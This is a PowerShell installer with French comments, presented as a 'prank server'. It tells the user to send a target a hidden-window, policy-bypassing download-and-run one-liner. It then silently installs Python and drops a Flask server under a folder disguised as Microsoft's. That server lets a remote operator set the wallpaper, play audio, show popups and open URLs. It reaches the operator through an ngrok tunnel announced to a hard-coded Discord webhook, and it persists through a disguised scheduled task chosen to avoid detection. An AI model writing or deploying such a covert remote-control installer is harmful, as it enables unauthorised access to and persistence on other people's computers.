# ═══════════════════════════════════════════════════════════════════════════════
#   PRANK SERVER — INSTALLATEUR SILENCIEUX
#
#   1. Modifie $WEBHOOK et $NGROK_TOKEN ci-dessous.
#   2. Heberge ce fichier (GitHub Gist → bouton Raw, ou autre hôte).
#   3. Envoie cette commande a ta cible via Win+R :
#
#      powershell -w h -ep bypass -c "iwr 'URL_RAW_DU_FICHIER' -UseBasicParsing | iex"
#
# ═══════════════════════════════════════════════════════════════════════════════

# ── A MODIFIER AVANT DE PARTAGER ─────────────────────────────────────────────
$WEBHOOK     = "https://discord.com/api/webhooks/1514603803637448836/OPmaAXfgSFSFAHwUyjTjoTZbc8fYiMaxN3xP8SAIlApaEDFFe-tq2IM6I2t_y0d5B7R2"
$NGROK_TOKEN = "VOTRE_NGROK_AUTHTOKEN_ICI"
# ─────────────────────────────────────────────────────────────────────────────

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference    = "SilentlyContinue"

# ── Repertoire : essaie C:\prank, sinon LOCALAPPDATA\prank ───────────────────
$INSTALL_DIR = "$env:LOCALAPPDATA\Microsoft\PyService"
New-Item -ItemType Directory -Force -Path $INSTALL_DIR | Out-Null

# ── Python (telechargement + installation silencieuse si absent) ──────────────
if (-not (Get-Command python.exe -ErrorAction SilentlyContinue)) {
    $setup = "$env:TEMP\py_setup.exe"
    Invoke-WebRequest `
        -Uri "https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe" `
        -OutFile $setup -UseBasicParsing
    Start-Process $setup `
        -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_launcher=0" `
        -Wait -NoNewWindow
    $pyBase    = "$env:LOCALAPPDATA\Programs\Python\Python311"
    $env:PATH  = "$pyBase;$pyBase\Scripts;$env:PATH"
}

# ── Dependances pip ───────────────────────────────────────────────────────────
& python -m pip install --upgrade pip --quiet --no-warn-script-location 2>$null
& python -m pip install flask flask-cors pygame requests pyngrok --quiet --no-warn-script-location 2>$null

# ── server.py (embarque) ──────────────────────────────────────────────────────
$serverPy = @'
import os, json, threading, webbrowser, tempfile, time, ctypes, requests
from flask import Flask, request, jsonify
from flask_cors import CORS

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
app = Flask(__name__)
CORS(app)

with open(os.path.join(BASE_DIR, "config.json"), encoding="utf-8-sig") as f:
    config = json.load(f)

def _set_wallpaper(path):
    ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(path), 3)

def _play_audio(path):
    import pygame
    pygame.mixer.init()
    pygame.mixer.music.load(path)
    pygame.mixer.music.play()
    while pygame.mixer.music.get_busy():
        time.sleep(0.1)
    pygame.mixer.quit()
    try: os.unlink(path)
    except: pass

def _show_popup(title, message):
    import tkinter as tk
    from tkinter import messagebox
    root = tk.Tk(); root.withdraw()
    root.wm_attributes("-topmost", True)
    messagebox.showinfo(title, message, parent=root)
    root.destroy()

@app.route("/wallpaper", methods=["POST"])
def wallpaper():
    if "image" not in request.files:
        return jsonify({"error": "champ image manquant"}), 400
    f = request.files["image"]
    ext = os.path.splitext(f.filename)[1].lower() or ".jpg"
    dest = os.path.join(BASE_DIR, "wallpaper" + ext)
    f.save(dest)
    threading.Thread(target=_set_wallpaper, args=(dest,), daemon=True).start()
    return jsonify({"status": "ok"})

@app.route("/audio", methods=["POST"])
def audio():
    if "audio" not in request.files:
        return jsonify({"error": "champ audio manquant"}), 400
    f = request.files["audio"]
    ext = os.path.splitext(f.filename)[1].lower() or ".mp3"
    tmp = tempfile.NamedTemporaryFile(delete=False, suffix=ext)
    f.save(tmp.name); tmp.close()
    threading.Thread(target=_play_audio, args=(tmp.name,), daemon=True).start()
    return jsonify({"status": "ok"})

@app.route("/popup", methods=["POST"])
def popup():
    data = request.get_json(silent=True)
    if not data:
        return jsonify({"error": "json invalide"}), 400
    threading.Thread(
        target=_show_popup,
        args=(data.get("title", "Message"), data.get("message", "")),
        daemon=True
    ).start()
    return jsonify({"status": "ok"})

@app.route("/url", methods=["POST"])
def open_url():
    data = request.get_json(silent=True)
    if not data:
        return jsonify({"error": "json invalide"}), 400
    url = data.get("url", "").strip()
    if url:
        threading.Thread(target=webbrowser.open, args=(url,), daemon=True).start()
    return jsonify({"status": "ok"})

def _send_discord(ngrok_url):
    wh = config.get("webhook_url", "").strip()
    if not wh:
        return
    try:
        requests.post(wh, json={
            "content": f"**{config['pseudo']}** est en ligne !\nURL : `{ngrok_url}`"
        }, timeout=5)
    except Exception:
        pass

def _start_tunnel():
    from pyngrok import ngrok, conf as nc
    token = config.get("ngrok_authtoken", "").strip()
    if token:
        nc.get_default().auth_token = token
    return ngrok.connect(9999, "http").public_url

if __name__ == "__main__":
    try:
        url = _start_tunnel()
        _send_discord(url)
    except Exception:
        pass
    app.run(host="0.0.0.0", port=9999, threaded=True)
'@

[System.IO.File]::WriteAllText(
    "$INSTALL_DIR\svc.py",
    $serverPy,
    [System.Text.UTF8Encoding]::new($false)
)

# ── config.json ───────────────────────────────────────────────────────────────
$cfgJson = ([ordered]@{
    pseudo          = $env:COMPUTERNAME
    webhook_url     = $WEBHOOK
    ngrok_authtoken = $NGROK_TOKEN
}) | ConvertTo-Json

[System.IO.File]::WriteAllText(
    "$INSTALL_DIR\config.json",
    $cfgJson,
    [System.Text.UTF8Encoding]::new($false)
)

# ── Demarrage automatique via Task Scheduler (moins detecte que VBS/Startup) ──
$taskName = "PyServiceHost"
$pw       = Get-Command pythonw.exe -ErrorAction SilentlyContinue
$pythonw  = if ($pw) { $pw.Source } else { "pythonw.exe" }
schtasks /create /tn $taskName /tr "`"$pythonw`" `"$INSTALL_DIR\svc.py`"" /sc onlogon /f /rl limited 2>$null

# ── uninstall.ps1 (depose sur la cible) ──────────────────────────────────────
$uninstallPs1 = @'
$ErrorActionPreference = "SilentlyContinue"
$dir = "$env:LOCALAPPDATA\Microsoft\PyService"
Get-Process -Name pythonw, python | Where-Object {
    (Get-WmiObject Win32_Process -Filter "ProcessId=$($_.Id)").CommandLine -like "*PyService*"
} | Stop-Process -Force
schtasks /delete /tn "PyServiceHost" /f 2>$null
if (Test-Path $dir) { Remove-Item $dir -Recurse -Force }
'@

[System.IO.File]::WriteAllText(
    "$INSTALL_DIR\uninstall.ps1",
    $uninstallPs1,
    [System.Text.UTF8Encoding]::new($false)
)

# ── Lancement immediat et silencieux ──────────────────────────────────────────
Start-Process $pythonw -ArgumentList "`"$INSTALL_DIR\svc.py`"" -WorkingDirectory $INSTALL_DIR
